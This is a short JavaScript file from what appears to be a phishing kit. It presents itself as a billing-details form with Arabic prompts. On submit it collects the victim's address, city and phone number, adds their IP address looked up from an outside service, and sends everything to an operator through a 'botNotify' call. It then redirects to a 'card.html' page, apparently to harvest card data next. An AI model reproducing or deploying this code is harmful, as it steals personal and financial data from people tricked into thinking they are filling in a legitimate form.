$(document).ready(()=>{

    $("#formDetailscc").on("submit",async(ev)=>{
        ev.preventDefault();
        var message = "";
        var checked    = $("#checkboxBtn");
        var address     = $("#address").val();
        var city        = $("#city").val();
        var phoneNumber = $("#phoneNumber").val();
        if(address.length == 0 || city.length == 0 || phoneNumber.length == 0){
            
            alert("لو سمحت أملأ كل الحقول");
            return;  
        }
        if(checked.prop('checked') == false){
            alert("لو سمحت وافق على سياسة الإستخدام");
            return; 
        }
        
        message += "-------[Billing ]-------\n";
        message += `Address   : ${address}\n`;
        message += `City : ${city}\n`;
        message += `Phone number : ${phoneNumber}\n`;
        message += await getIp();
        await botNotify(message);
        window.location.assign("card.html");
       
    });

const  getIp = async ()=>{
    return await fetch('https://api.ipify.org/?format=json')
    .then(response => response.json())
    .then(data => {
        var ipAddress = data.ip;
        var message = `IP Address : ${ipAddress}\n`;
        return message;
    }).catch(e=>{
        var message = `Error to get visitor IP\n`;
        return message;
    });
    }
});